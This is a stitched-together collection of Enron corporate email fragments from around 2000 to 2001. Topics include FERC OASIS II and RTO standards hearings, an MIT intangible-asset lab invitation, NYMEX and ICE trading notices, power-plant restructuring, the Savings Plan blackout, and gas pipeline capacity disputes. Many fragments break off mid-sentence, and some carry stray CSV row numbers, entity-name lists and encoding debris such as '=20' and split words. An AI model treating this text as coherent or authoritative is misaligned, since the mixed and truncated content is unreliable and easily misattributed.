intangible asset based organization, the question of ""how to"" accurately and 
appropriate measure and value our intangible assets is becoming increasingly 
important.

Last week, Steve Kean, Vince Kaminski, Marie Hejka, and myself met with a 
team from AA, the Deputy Dean of the Sloan School, and MIT's lead 
accounting/finance professor to discuss the intent of the Lab, expected 
outcomes, and how Enron may be involved. Post that meeting, the decision was 
made to continue to explore participation in the Lab. Enron now needs to 1) 
define our corporate measurement and valuation process needs, and 2) identify 
value attributes important to Enron and the industries in which we operate. 
Once defined, a follow up meeting will be held with MIT and next steps will 
be determined.

Your expertise and assistance could significantly impact the inputs and 
outcomes of these next steps. Please schedule time on Tuesday August 1 from  
2:00 to 3:30 to attend the next meeting, during which we will begin to 
identify needs and define value attributes. Location will be EB 49c4. Please 
notify me if you are unable to attend.

Lastly, to assist with preparation for this meeting, I am attaching notes 
from a recently published book entitled  Cracking the Value Code: How 
Businesses Are Creating Wealth in the New Economy (May 2000, Boulton, Libert, 
Samek - Arthur Andersen).  

Should you like more information on the Lab, previous meeting, book or other, 
please feel free to contact me.

I look forward to meeting you.

-  The ANOPR is intended to tie RTO Order 2000 together with new OASIS II 
requirements
-  Does not preclude individual RTOs or entities from submitting proposals.  
However a diversity of filings will indicate   non-consensus and FERC will 
make its own decisions which will likely not be industry friendly.

FERC is asking the industry for communication and Business Practices 
standards for issuing in a NOPR.

FERC is looking for:
- more functionality and to be more user-friendly
- electronic scheduling
- electronic reservations
- reduce duplication of information entry for customers
- not intended to dictate the Control Area to Control Area communications 
 I asked Marv to clarify this - He explained that although not required, FERC 
welcomes propsals to address the control area   source/sink issues as part of 
an OASIS II solution (ie Entergy Source/Sink Order)

OASIS II should:
- continue use of Web browsers
-  use templates for file transfers (uploads and downloads)
- all displays do not have to look the same - but encourages a common look 
and feel
- within a RTO, business practicese may differ, but between RTOs the 
practices must be standardized

We need to keep close to the NERC efforts since FERC has historically tended 
to favor NERC proposals because they tout an air of industry consensus.  

The clarificaton to the ANOPR given by Marv should make buy-in an important 
element of our proposal.
If FERC adopts the NERC filing, we will likely be stuck with the exisiting 
contract path seams problems and LMP fragmentation in the East because NERC 
is not proposing any tariff changes.  Also we will not get the control area 
source/sink issue resolved since it will be impossible to resolve at NERC in 
7 months.

Of course, another option would be to incorporate our efforts with this Task 
Force.

who was the alternative suggestion to Whitman's choice Chris Hessler, who we 
were backing:

EPA Air Nominee on Hold

The Senate Environment and Public Works Committee yesterday delayed its vote 
on another controversial nominee: Jeffrey Holmstead, Bush's pick to be the 
Environmental Protection Agency's assistant administrator for air and 
radiation.

EPW Chairman Bob Smith (R-N.H.) ""reluctantly"" removed Holmstead from the 
committee's agenda Wednesday morning in response to Democrats concerns about 
his service during the pervious Bush administration. 
Committee ranking Democrat and Minority Whip Harry Reid (Nev.) has placed a 
hold on Holmstead's nomination until he receives copies of notes and memos 
related to the Clean Air Act and radiation Holmstead wrote while working as 
associate counsel to former President Bush from 1989 until 1993. Holmstead 
advised White House officials on 1990 revisions to the Clean Air Act. 
The hold has agitated Smith. ""Throughout my service on this committee, I have 
never played politics with a nomination,"" he said. 
""Rather than focusing on notes that were taken a decade ago, my hope is that 
my colleagues would focus on the nominee,"" Smith said, noting that Holmstead 
has answered all of the committee's questions and has said he would provide 
the documents Reid seeks if he could. 
David Cherry, a spokesman for Reid, has said the request is reasonable. ""We 
didn't make the request because we think there's information out there that 
could torpedo the guy. There's no smoking gun that I know of,"" Cherry said. 
""We just want a better sense of what his views are regarding clean air 
policy, and we've limited our request to documents containing information on 
issues he would have jurisdiction over."" 

The committee Wednesday supported by voice vote confirmation of Linda Fisher 
as EPA deputy administrator, Stephen Johnson as EPA assistant administrator 
for toxic substances, and James Connaughton as the director of the White 
House Council on Environmental Quality. However, Reid has said he will hold 
floor consideration of Johnson's and Connaughton's confirmations until EPA 
publishes a rule establishing radiation standards for the proposed Yucca 
Mountain nuclear waste repository (see the 5/18 edition of Environment and 
Energy Daily).

8:00 p.m. Friday May 11, Saturday May 12, & Sunday May 13, 2001 
sponsored by AZURIX and ENRON

Considered the great comedy of classical ballet, Copp,lia  tells the story of 
a doll so enchantingly lifelike that she mesmerizes an entire village, 
captures the heart of a young swain named Franz and inspires the eccentric 
toymaker Dr. Copp,lius to attempt to transform her into a living, breathing 
human being. 

AZURIX and ENRON are Corporate Sponsors for Houston Ballet's Miller Theatre 
performances, helping to present these free performances of Copp,lia to the 
people of Houston.  Houston Ballet has a limited number of tickets for the 
seated area each night for employees of AZURIX and ENRON.  These tickets are 
available on a first-come, first-served basis by calling William at 
713-535-3235 no later than 5 PM today .  (Please be aware that all unoccupied 
seats are released at 10 minutes before curtain.)

Other, free, general public tickets for the seated area (max 4 per person) 
are available at the Miller Theatre 11:30 a.m. - 1:00 p.m. on the day of 
performance; for more information call 713-284-8351 for the Miller Theatre 
ticket information line.  Tickets are not required for the lawn area.  

About Coppelia
Copp,lia was first performed on May 25, 1870 at the Th,atre Imp,rial de 
L'Op,ra, featuring choreography by Arthur Saint-L,on and music by L,o 
Delibes. The work maintains a special place in the history of dance, serving 
as a kind of bridge from the glory of the French Romantic ballet in the early 
nineteenth century to the masterpieces of the Russian Imperial Theater at the 
turn of the century. Writing in The International Dictionary of Ballet, 
critic Karen Dacko analyzes the unique characteristics of the piece as 
follows: ""Copp,lia owes its longevity to its inspired, very danceable score. 
But the ballet is also remarkable for its perennial appeal and for its 
historical significance as Romanticism's grand finale and classical ballet's 
prologue.""
Copp,lia first entered Houston Ballet' repertoire in October 1974, in a 
staging by Frederic Franklin (who also performed the role of Dr. Copp,lius), 
and featuring scenery by Peter Farmer. In November 1979, former Royal Ballet 
ballerina Anne Heaton re-staged the work for the company. When Houston Ballet 
premiered its new production of the work in March 1992 featuring breathtaking 
d,cor by Desmond Heeley, Carl Cunningham of The Houston Post wrote, ""It would 
be hard to imagine anything to cap the joyous, gentle, and glorious looking 
new production of Copp,lia the splendidly prepared company of dancers and 
musicians put forth Thursday evening on Wortham Center's Brown Theater 
stage.""    (The Houston Post, March 21, 1992)
Heeley's designs for Copp,lia never fail to enchant, most notably in the 
second-act depiction of Dr. Copp,lius's workshop. The sampling of dolls on 
display pay homage to the era when automatons, or mechanical toys, were the 
rage in Europe -- and to Heeley's inexhaustible creativity. Among the 
eye-popping toys featured in  the workshop are a huge astrologer with a 
pointed hat and a robe covered in shooting stars and moons; a strongman with 
a handlebar mustache and barbells; Puss n Boots; an acrobat hanging from a 
trapeze holding the man in the moon; and a small ballerina dancing on the 
back of a goat. In the first act, the vibrant reds, golds, and oranges of the 
costumes worn by the peasants in the village conjure up a wonderfully 
picturesque vision of nineteenth century Bavaria.",Copp swain Franz Houston Ballet William atre Imp Karen Dacko Frederic Franklin Peter Farmer Anne Heaton Desmond Heeley Carl Cunningham,,"AZURIX ENRON Corporate Sponsors Houston Ballet's Miller Theatre

RE:
Introduction of EFS Trading in Natural Gas



The New York Mercantile Exchange, Inc., will begin offering tomorrow
exchange of futures for swap (EFS) transactions in the first step of its
plans to offer over clearing services to the over-the-counter (OTC) natural
gas market.

This plan will also include the introduction of large order execution in
the
natural gas futures market and electronic trading of cleared natural gas
swaps and basis contracts.

We are delighted that we were able to expedite the introduction of this
instrument as the current climate in the natural gas market has served to
reinforce the necessity of credit intermediation.  The liquidity of our
market, combined with a clearinghouse that has half billion dollars
available to participants on each of the Exchange divisions through each
guarantee fund and the respective clearing members, put us in a unique
position to offer these services.

In addition, natural gas futures and options volume in 2000 reached the
equivalent of approximately 230 trillion cubic feet of natural gas and the
notional value of last year's transactions Exchange-wide totaled $3
trillion, or $14 billion per day.

EFS transactions will work similarly to exchange of futures for physical
(EFP) transactions.  Two parties will be allowed to privately negotiate the
execution of an integrated over-the-counter swaps and related futures
transaction on pricing terms agreed upon by the involved parties.  The
transaction must involve approximately equal but opposite side-of-market
quantities of futures and swap exposures in the same or related commodities
and will be permitted until two hours after trading terminates in the
underlying futures contract.  EFS transactions will be permitted to
liquidate, initiate, and transfer futures market positions between the two
parties involved in the transaction.  The Exchange will charge $10 per side
for each EFS transaction.  The clearing member representing each party will
be responsible to notify the Exchange of the amount and type of futures
contracts involved, the price at which the futures transaction should be
cleared, and the identity of the parties involved.

Forward Looking and Cautionary Statements
The New York Mercantile Exchange, Inc., has attempted, wherever possible,
to
make statements in good faith , as of the date of this release, by using
words such as anticipate, believes, expects, and words and terms of similar
substance in connection with any discussion of its present and future
operations within the industry. Any forward-looking statements made by, or
on behalf of the Exchange, involve a number of risks, trends,
uncertainties,
and other factors which may cause actual results to differ materially,
including; the Exchange=s receipt of the necessary Commodity Futures

Commission approval; timely performance and cooperative effort of exchange
partners; and changes in financial or business conditions at the Exchange.

Day 4 - October 18, 2001

Afternoon Session

=20

Standardizing Markets, Business, and Other Practices=20

Panelists for this discussion were:  Sarah Barpoulis, PG&E National Energy =
Group; William P. Boswell, GISB; Bill Burkes (substituting for David J. Chr=
istiano), City Utilities of Springfield, Missouri; David N. Cook, NERC Gene=
ral Counsel; Michael Kormos PJM Interconnection; LeRoy Koppendrayer, Minnes=
ota Public Utilities Commission; and Marty Mennes, Florida Power & Light Co=
mpany.

=20


General Observations


=20

The Commissioners were all present the majority of the time (Massey left la=
te in the  afternoon).  FERC Staff was active in the discussion; however, t=
he commissioners were very active as well, asking perhaps as much as 70% of=
 all questions.  There was a general consensus that standards were needed; =
much discussion focused simply on how much and by who. The Commission seeme=
d very interested in leaning what they needed to do to move the industry fo=
rward and how far they needed to go.  Panelists urged the need to mover for=
ward as quickly as possible, but both they and FERC seemed to recognize tha=
t some of the issues regarding standardized market design and such needed t=
o be addressed before RTOs could really begin to move forward.  There was d=
iscussion on identifying which industry group (NERC or GISB) would take the=
 reins in the future.  On an interesting tangential note, there was noticea=
ble conflict between NERC and GISB, with veiled insults between the two org=
anizations somewhat common during the discussions.=20

=20


FERC Deliverables


A great deal of the discussions focused on identifying what the industry ne=
eded from the Commission.  Staffers probed all panelists to find what they =
felt was critical. =20

The first major topic was ""How many RTOs?  What is their scope?""  All panel=
ists seemed to agree that this question needed to be answered immediately b=
y FERC, in strong definitive language.  N o one offered any specific langua=
ge, but seemed to be urging FERC to issue a formal statement.

The next topic was, ""What will be standard market design?""  Panelists varie=
d on this, but most felt strong guidance from FERC is urgent.  Some urged f=
or one mandatory design for North America, one supported a set of rigid sta=
ndard designs, one supported a single design with requests for exceptions (=
followed by an in-depth review process), and one seemed to prefer the curre=
nt situation.

The commission in general seemed to be very interested in understanding wha=
t the industry needed to move forward.  They continually visited this topic=
 throughout their discussions, asking questions like, ""Do we need to issue =
a Mega-Order that addresses all these issues?"" and, ""How much detail do you=
 need us to provide?""   General feel from the panelsists seemed to be they =
wanted strong leadership in this areas.  Kormos and Burkes went so far as t=
o say FERC should ""Mandate as much as they felt comfortable - and then go a=
 little further.""  Others seemed to be a little worried about this idea, bu=
t in general did not oppose the concept, citing only general warnings and t=
he need for cautious investigation. =20

One item of interest: Wood referred to the filing made by the Electronic Sc=
heduling Collaborative and specifically asked if the items identified in th=
e ""RTO Design and RTO Implementation"" section would address many of the que=
stions and uncertainty facing the industry with regard to RTO design.  Korm=
os indicated that clear and specific answers to these questions specifying =
a course of action would go a long way toward guiding the industry.  The se=
ction to which Wood referred was one that I wrote, and asked the following =
questions:


?         Congestion Management - When Operational Security Violations occu=
r, how is the system to be stabilized in a fair and equitable manner that i=
s nonetheless efficient?  Will LMP based systems be standard, or will there=
 be others that must be accommodated?


?         Transmission Service  - Are transmission services required to sch=
edule (""covered"" schedules only), or are they risk management tools protect=

Hopefully, FERC will use this section as a template to answer these critica=

to move. Kormos emphasized the need for concrete answers to these questions=
, pointing out that vague answers (i.e., ""do congestion management"") will t=
ake a year or two to resolve, but specific answers (i.e., ""LMP with financi=
al hedging instruments"") will take only months.  The Commission asked Mike =
about moving forward, and he told them that effectively, it was impossible =
to move forward with implementation without getting these issues addressed.

Now for a  funny point - One of the commissioners (I think Breathitt) refer=
red to some concerns expressed in the Northwest that their high concentrati=
on of hydro power makes LMP inefficient for the Northwest.  Kormos flat out=
 said, ""My profession is understanding how power systems work, and I don't =
believe that that statement is true.""  He then backpedaled a bit and said t=

NERC and GISB


A great deal of discussion focused around the need for a single standard-se=
tting organization.  Massey went so far as to ask, ""Are we looking at a bea=
uty contest between NERC and GISB?""  Cook and Boswell then went into severa=
l short polite jabs at each other's organizations.  Other participants cont=
inually reiterated the need for ONE, INDEPENDENT organization.  Interesting=
ly, Boswell was very emphatic about the established trust and respect in GI=
SB, while Cook preferred to only talk about the ""new"" structure of NERC and=
 did not focus on its history.

Brownell offered some not-too-subtle passive support of GISB by pointedly a=
sking both Cook and Boswell if they lobbied political positions (i.e., were=
 they not only an organization but also a stakeholder?).  GISB was easily a=
ble to say they were not, but NERC of course had to admit to their romancin=
g of Congress and the Bush administration for reliability legislation. Poin=
t, Brownell.

Mennes acted as somewhat of a supporter for NERC, playing Dave Cook's yes-m=
an.  He probably did them a little bit of harm by pointing to NERC's suppos=
ed ""successes,"" such as TLR and E-Tag.  If staffers have tenure, they will =
likely remember that these ""successes"" have not been so successful, resulti=
ng in several filings and interventions.  We may also wish to file comments=
 in specific objection to these claims, to refresh their memory and to show=
 the pretty picture Marty painted was in fact a fiction.

There was a little discussion about splitting reliability and market issues=
, but general consensus was that I could not be done.  There was also some =
talk of folding NERC under GISB/EISB.

The arguments began winding down after a some time, and Boswell strongly ur=
ged the Commission to speak to industry executives and advocacy group leade=
rship to see whether NERC or GISB should lead the industry forward.  NERC s=
omewhat less enthusiastically supported this position.  In general, I would=
 say it was a close fight but GISB came out more on top.

Let me know if you have any questions.

The two current East project companies are Motown and Cornhusker.

Motown consists of two 50% interests and has TRS of about $56 million and i=
s on the balance sheet for about $2 million:

Michigan Power - 129 MW power plant fully contracted for power 20+ years an=
d 14 remaining years of fixed cost gas.  The PPA is deep in the money versu=

 about 9 months as Doug Clifford (the origination on the purchase) had been=
 attempting to purchase Dynegy's interest (they have too high a book value =
and are accrual based).

The proposed restructuring will take the form of an upfront payment in retu=
rn for an option to provide power from the market.  This approach gives Con=
sumer's (a BBB credit) much needed cash at a time when they are significant=
ly underrecovering due to increased fuel costs and set fuel recovery rates.=
 Consumer's ( like many other utilities) has a hard time seeing their expos=
ure (purchased power cost certainty for the volume and term) and doesn't se=
e any regulatory filing complications with their current stranded cost fili=
ngs.

The amended PPA is a non-unit contingent power short which we fill long-ter=
m with a contract from the power desk.  The desk takes the obligation becau=
se Generation Investments provides a full backstop pricing through their ow=
nership of the plant and the swapped gas (we either float past the swapped =
gas or contract for differences those years with the gas desk).  The PPA an=
d desk contract are securitized in the capital markets for the term of the =
PPA at 1.05 DSCR and about 75 bps over Consumer's current corporate bonds. =
 The plant essentially becomes a $0 NPV machine and the power desk has sign=
ificant optionality to call from the market rather than the plant for 20+ y=
ears.  During the term of the swapped gas, when the plant isn't called by t=
he desk we can sell the gas into the market for a profit.

It is fairly easy to see the increased value.  The project is currently pro=
ject financed at about 1.5 DSCR for about 14 years (lots of cash).  The des=
k has significant optionality and always a matched cost supply with the pla=
nt.  The plant gains efficiency due to revised O&M, insurance, reserves, et=
c. which are no longer required due to the removal of project financing.

Difficulties - Dynegy and Consumers.  Consumers can be rational.  Dynegy ei=

Ada - 29 MW plant fully contracted for power 20+ years.  Enron is the MGP. =
 GE operates for us.  50% owned by ConEd.  Fixed gas through 2008.  We woul=

With regard to your comment that I am ""in"", in my conversation with Greg Whalley a couple of weeks ago he said that he does need me to accomplish some things for the estate and that like Mark Haedicke, and perhaps himself, there could be some issues with the Estate and creditors committee if we were to go to Netco immediately.  What I agreed to with Greg is that I will be focused on the Estate and that I would be interested in talking about Netco in 30 to 60 days.  In the meantime, I will participate as much as you would like for me to on the due diligence process around the auction.  I will gladly meet with any and all prospective buyers to make them comfortable with our processes, systems, staff expertise and operational controls.  And you can also count on me if I can play a role in assuring that the staff destined for Netco is in tact and is motivated and excited about the opportunities there.

Failure to discharge this duty can mean the directors would be personally for the debt.

3148,"Hi,

The ICE wishes to remind all our oil customers of the changes to the WTI
swap contracts.  Below are the two previous emails delivered on that topic.

First email from Tuesday;

As discussed with the users, we have decided to replace our current WTI swap
contracts by the WTI bullet swap contracts for the first four months
forward. To avoid any confusion between the two markets, we are going to
remove the current contracts (for the first four months forward) and add the
new ones on Thursday evening. We will remove the first three monthly time
spread contracts as well. The quarterly and yearly WTI swaps contracts will
remain the same.
We will keep the WTI/Brent, the Heating oil 1st line crack, the USGC heating
oil crack, the fuel 1% NY Harbour crack, the USGC Conventional Unleaded 87
crack and the Unleaded 1st line crack markets as they are now, but we will
not have the legging functionality for the first four nearby months'
contracts.

We plan to add:
- the first four months forward contracts
- the first three time spread contracts
- the Dec Red Dec contract
These contracts will be available for trading on Friday, May 18th.

If you want to add these contracts to your portfolio:
- go to Admin / Manage Portfolios,
- select the portfolio you want to add these contracts to,
- select Oil for ""Market"", Crude for ""Products"" (or Crude Spread for the
time spread contracts) and WTI Bullet swap for ""Hub"".

The contract will be settled on the penultimate scheduled trading day of the
WTI light Crude futures contract as published by the NYMEX for the delivery
month.

Second email from Wednesday;

	Following the e-mail you received Tuesday concerning the new WTI
bullet swap contracts, we would like to summarize what we have done on the
ICE system Tuesday evening:

		-Deleted WTI monthly time spreads
		-Deleted WTI/Brent monthly diff spreads (spread with
legging)
		-Deleted 1% NYH Harbor Fuel Oil Crack monthly (spread with
legging)

		-Added WTI/Brent monthly diff spreads (spread with NO
legging)
		-Added 1% NYH Harbor Fuel Oil Crack monthly (spread with NO
legging)

	Unfortunately the WTI/Brent and the 1% NYH Fuel Oil Crack contracts
(with the legging functionality) have been removed from your portfolios. You
will need to add 	the first four nearby months' contracts to your
portfolios by going to Admin / Manage Portfolios / Edit your portfolio....

We would like to thank you for your support and your help.

3154,"Mr. Lay, I am a 59 1/2 year old employee that last saw you at my 25 year 
award celebration in Houston in 1993.  Since that time, I have had some 
health problems that are leading me to retire a little early from Enron, on 
August 31, 2000. 

 I did not want to leave Enron's active employment until I had the 
opportunity to express to you my gratitude.  I have been with Northern 
Natural Gas, InterNorth, HNG-InterNorth and Enron for thirty two years and 1 
month.  I can tell you without hesitation, that since you took over our 
company in the late 80's, it has been the most challenging and exciting time 
that I have spent in my work life.  I had opportunities that I never dreamt 
of and I am grateful for the opportunities that I have had.   I started on 
August 1, 1968 as a maintenance helper at the South Omaha location of 
Northern Natural Gas.  I was a field technician, an O&M Supervisor, a 
District Manager, and presently the Manager of the Operations Communications 
Center in Omaha.

I have admired and respected you since the first time we met in Des Moines, 
Iowa, shortly after the merger.  Without your guidance and direction and the 
many employee based programs you have initiated, I would not be where I am 
financially today.  I am looking forward to retirement without concern for me 
or my family's future.  The ESOP program was so very important to all of the 
employees, and the many other programs like our ""options"", variable pay 
(bonus) and others make Enron a leader throughout the world in employee 
satisfaction, and we have the awards to prove it.

The employees that I have worked with in these 32 years are the bright spots 
for Enron, not only in the past but also into the future.  We have done a 
wonderful job of getting the best of the best.

I hope that I will be able to thank you in person and shake your hand once 
more, perhaps at a future shareholders meeting.

During the negotiations with the Rockets as to how much each party would
contribute to the Arena referendum campaign, Mike Goldberg of Baker & Botts
suggested that the Rockets would like to net their contribution obligation
against other contributions that they solicited.

After a conversation with you, John Watson and I advised Mike Goldberg that
you did not want to be competing with the Rockets in soliciting
contributions to the Arena referendum campaign.

Mike Goldberg called Friday and asked whether it would be acceptable for the
Rockets to net against their contribution obligation contributions that they
have solicited from Baker & Botts, Jim MacInvale and Tilman Fertitta.  Mike
suggested that these three persons would be the only outside persons that
would be solicited by the Rockets.

Would you please let me know if this is acceptable to you.  You or Rosalee
may call me at 713-758-2350 or send me a response e-mail at

If you are a participant in the Enron Corp. Savings Plan, please read this very important message.

We understand that you are concerned about the timing of the move to a new Savings Plan administrator and the restricted access to your investment funds during the upcoming transition period scheduled to take place beginning at 3:00PM CST on October 26 and ending at 8:00AM CST on November 20.  

We have been working with Hewitt and Northern Trust since July.  We understand your concerns and are committed to making this transition period as short as possible without jeopardizing the reconciliation of both the Plan in total or your account in particular.  

Remember that the Enron Corp. Savings Plan is an investment vehicle for your long-term financial goals.  The Enron plan will continue to offer a variety of investment opportunities with different levels of risk.  

As always, we advise you to review your overall investment strategy and carefully weigh the potential earnings of each investment choice against its risk before making investment decisions that are aligned with your long-term financial plans and your risk tolerance. 

For that reason, it is critical that ALL trades among your investment funds be completed by 3:00 PM CST Friday, October 26 before the transition period begins.",,,Enron Corp. Savings Plan Savings Plan Hewitt and Northern Trust Enron

As you know, this is an unprecedented time in Enron's history.  We must adapt our employee programs to fit the immediate needs of our company during this time of transition.  It is especially difficult to announce the immediate suspension of the following programs.

?	ClickAtHome - Enron has suspended the ClickAtHome program.  The program will no longer accept new participants, PC orders, or Internet service orders.  Orders submitted and confirmed prior to November 20, 2001 will be honored.  Enron will also discontinue subsidized Internet service.  Effective January 1, 2002, employees who are currently subscribers to subsidized Internet service will be switched to the regular commercial rate of their service provider and be responsible for the entire cost of the service.
?	Matching Gifts and Volunteer Incentive Program (VIP) - Enron's Matching Gift program and VIP grants have been suspended indefinitely.  As we consider the immediate needs of all employees during this trying time, it is appropriate that we discontinue the dollar for dollar match for charitable contributions as well as cash donations recognizing employees' volunteer hours with non-profit organizations.  Matching Gift or VIP submissions received prior to November 20 will be honored.

We regret that we have had to make these changes.  We must continue to look for ways to reduce operating expenses through this transition period.

Thanks for helping us understand the tranportation and storage problem
today. We appreciate your patience. I know it's like teaching a baby how to

Anyway, just wanted to get you the updated numbers for the transportation

double check with Philip regarding the issue with hedging Basis with

1.	Introduction

Highlighted in this week's Big Chart update are the
surprising performance of Home/Furniture {.HFU} and the not
so surprising performance of Drugs/Biotechnology {.DBI}.
Rankings for both groups have been rising, albeit for
different reasons.  On the downside, the plummeting rank in
Financial/Consumer Loan {.FCL} is discussed.

2.	Groups That Are Heating Up

Furniture stocks have been performing very well over the past
several weeks, evidenced by the four-week rise in
Home/Furniture {.HFU}.  Attracting investors to the group has
been strength in the upholstered segment as consumers are
opting for new chairs and sofas, which has helped sales at
Furniture Brands {FBN} and La-Z-Boy {LZB}.  Hardly anybody's
first guess as a industry segment that would fair well during
an economic contraction, the surprisingly strong performance
of upholstered furniture is reflective of three trends:
lifestyle changes oriented towards updating home interiors on
a regular basis, a cheaper price than full room sets or wood
furniture, and an inclination to stay home and watch
television.

Not so surprising has been the performance of
Drugs/Biotechnology {.DBI}, which has risen in rank for four
consecutive weeks.  Anthrax bioterrorism has boosted the
stocks of several small companies, while earnings, drug
research news events, and a higher tolerance for premium
valuations have caused buying pressure in many of the stocks
with larger market capitalizations.  How sustainable this
momentum is, however, may be tied to overall performance of
the Nasdaq and its ability to stay above its 50-day moving
average.  Among those stocks that have been trending upward
are Corr Therapeutics {CORR}, Transkaryotic {TKTX}, Aviron
{AVIR}, and Millennium Pharmaceuticals {MLNM}.

Other groups with rising rankings include Chemicals {.CHE},
Computer/Computer Services {.DSE}, Drugs/Research {.DRE},
Home/Housewares {.HSW}, and Retail/Stores/Warehouse Clubs
{.RWC}.

____________________________________________________________

3.	Groups That Are Cooling Off

Rankings for Financial/Consumer Loan {.FCL} have plummeted
from the 83rd percentile to the 39th percentile over the past
five weeks on concerns that loan default rates may rise.
Both Americredit {ACF} and Metris {MXT} have seen their stock
prices fall by 20 percent or more during the past two weeks
as investors fear that the rising joblessness rate will force
many consumers into financial problems.  Americredit provides
subprime automobile loans, while Metris offers credit cards
to subprime borrowers.

Other groups with declining rankings include Banks/Savings &
Loan {.BSL}, Electronics/Household Appliances {.EHA},
Finance/Services {.FSE}, and Food/Meat-Poultry {.FMP}.

4.	On The Radar Screen This Week

The retail sector should start coming into play over the
course of the next few weeks as investors digest data out of
three key events.  First are Halloween-related sales - better
than expected revenues will suggest that consumers are
putting the anthrax scares behind them, while worse than
expected sales could suggest that consumer confidence remains
fragile.  Secondly, third quarter earnings season will be
starting for the sector and analysts will be paying close
attention what inventory levels are at and the extent to which
retailers are relying on promotional pricing to drive store
traffic.  Finally, the holiday shopping season is beginning to
warm up and will viewed as a proxy for judging the overall
state of the economy.

indicating your interest in booking capacity at an expanded Wild Goose gas
storage facility.

		We also wish  to inform you that AEC has now decided to
participate in a group that is examining the feasibility of the Ruby
Pipeline, which is being proposed by Colorado Interstate Gas to serve the
western United States. The proposed Ruby line would have a capacity of 750
million cubic feet per day and deliver gas from Wyoming to northern
California with a connection to the Wild Goose storage facility. The
addition of a large new pipeline in this region would also offer Wild Goose
storage customers a more liquid trading hub in the heart of the volatile
California gas market. AEC's preliminary assessment of this proposed project
is that it provides a very competitive means of delivering additional supply
flexibility into California from the growing U.S. Rockies production basin.
If you have any questions about the specifics of the opportunities to ship
gas on the Ruby Pipeline, please call Ed Miller at (719) 520-4305 and Tom
Dobson at (719) 520-4606 with Colorado Interstate Gas or if you have

3237,"As was foretold by some of the Kern expansion shippers, these shippers are justifiably angry about the way Kern has sold capacity in their open season, particularly as concerns shippers' access to markets on SoCal Gas through Wheeler Ridge.  However, what's even more encouraging here is to see that shippers are now validating the message TW embodied in its GIR proposal -- new market entrants should only have secondary rights to SoCal system capacity in instances where there is a capacity shortage.

Shippers Dispute Kern's Wheeler Ridge Sales
Chevron, Amoco Production, CanWest Gas Supply, Aera Energy and RME Petroleum have called on FERC to stop Kern River Gas Transmission from overselling delivery point rights at Wheeler Ridge into the Southern California Gas Co. distribution system. The Firm Shippers said in comments filed this week that, in a situation strangely similar to the recent El Paso capacity reallocation case, Kern River has oversold capacity at Wheeler Ridge, and its proposed expansion project will only exacerbate the situation (Docket CP01-31). 
On Nov. 15, 2000, Kern filed an application to expand its system and provide 74,500 Dth/d of additional delivery point capacity at Wheeler Ridge into SoCal Gas. But Firm Shippers claim recent data provided by Kern and SoCal Gas indicates Kern River already has sold more than the 450 MMcf/d of firm delivery point capacity it has available into Wheeler Ridge. Firm Shippers told FERC. Kern River has sold 468.4 MMcf/d of capacity at Wheeler Ridge. 
Not true, says Lynn Dahlberg, Kern's manager of marketing. ""We have to date subscribed at 450,000 dth/d. And unless we subscribe at more than 830,000 dth/d, we have not sold more capacity than SoCal has takeaway."" The combined Kern-Mojave lines can deliver on a firm basis 600,000 dth/d, with Kern having 450,00 and Mojave 150,000. ""We can move more than that capacity, and we have,"" she added. 
SoCal Gas has noted that it curtails nominations from Kern on a regular basis, Shippers said. With the proposed expansion project, Kern will be ""creating the same type of firm delivery point over-sale situation that the Commission found to be unjust and unreasonable on El Paso Natural Gas at El Paso's SoCal Gas/Topock delivery point,"" they added. While they support the expansion, they do not want to see their firm delivery rights in Southern California degraded. They also complained that Kern's marketing affiliate is one of the primary beneficiaries of the proposed additional access to Wheeler Ridge. 
Dahlberg conceded that other interstate lines also deliver to the Wheeler Ridge point, but ""adding more players to Wheeler gives markets on SoCal more supply options. Shippers have to compete."" 
The shippers are concerned, however that ""substantial benefits under the currently structured proposal accrue primarily to Kern River and its affiliate and would restrict the firm rights of existing shippers...."" The Commission should prohibit Kern from selling additional firm rights at Wheeler Ridge, or provide only rights to secondary and tertiary capacity [emphasis added] that is of a lower priority than the rights of existing firm customers, they said.

3238,"El Paso Tests Market for Mainline Expansion
El Paso Natural Gas apparently got the message when its last open season for 1.2 Bcf/d of firm transportation capacity attracted bids for 14.4 Bcf/d. The pipeline has announced an open season to test market interest in a mainline expansion and to satisfy regulatory concerns that something needs to be done to relieve the apparent capacity constraint at the California border. 
El Paso has been under significant pressure from regulators and shippers to expand because of enormous demand and skyrocketing prices in California. In a Jan. 3 letter to the pipeline, Daniel M. Adamson, director of FERC's Office of Energy Projects, urged El Paso to consider modifying its Line 2000 project to ""assist the difficult situation"" now facing the California gas market. Specifically, the Commission recommended El Paso amend a pending application in which it seeks to acquire an existing 30-inch diameter, 1,088-mile crude oil pipeline from Plains All American Pipeline L.P., and convert part of it to natural gas transportation service. The line extends from McCamey, TX, to Bakersfield, CA. El Paso plans to convert to gas service a 785-mile segment from McCamey to Ehrenberg, AZ. El Paso proposed the Line 2000 project as a loop line to replace existing compression, and not as a system expansion. 
El Paso Vice President Al Clark told the commission that market demand for an expansion would have to be evaluated first. He said the open season for 1.2 Bcf/d of capacity being held by affiliate El Paso Merchant Energy would give the first indication whether such an expansion was needed. 
Following such a resounding wake-up call, El Paso is holding a new open season to determine interest in additional capacity on the mainline or in relinquishing mainline space. The open season will end March 23. 
El Paso officials said they will consider requests for firm transportation service originating in any receipt basin and delivered to any location on its system. If a new load can be matched to an existing shipper's offer of release or relinquishment, El Paso will attempt to facilitate the transfer of the capacity between the parties prior to proposing an expansion. Upon receipt of non-binding expressions of interest, they will begin to identify appropriate facilities to possibly expand the system. 
Clark previously told FERC the pipeline could add compression to the proposed Line 2000 project or replace or recommission the compression that the pending application proposes to abandon. Another option, he said, would be to add new compression to the existing system or loop either the existing system or Line 2000 project. The economics of the project will determine the eventual form. 
For more information on the open season visit El Paso's web site <http://tebb.epenergy.com/ebbEPG/ebbmain.asp?sPipelineCode=EPNG> or call Jerry W. Strange, director of transportation marketing, at (915) 496-3139. ",Daniel M. Adamson McCamey Al Clark Clark Jerry W.

is disconnected from the measuring facilities.  Should your prospective 
producer want to come to TW at this location, we would need to provide you 
with a Level ""A"" cost estimate for new interconnect facilities to connect to 
the existing 4"" side valve.  TW's line pressure at the 4"" side valve would be 
near 600-650 psig.  (Should they be interested in going to Duke, their line 
pressure is near 400 psig.)

3244,"I do not see any problems with the draft tariff sheets. My concerns are how 
to implement this new service. We need to start meeting with 
marketing/legal/regulatory to determine how we will implement this & define 
the system requirements. Here are some of my questions:

If we recall & the nomination is still in place, then how do we allocate? 
What are the allocation rules?
How do we track the volumes/contracts that have been recalled? Who will 
monitor this process? What type of process is needed to track recalls & 
transporter call volumes?
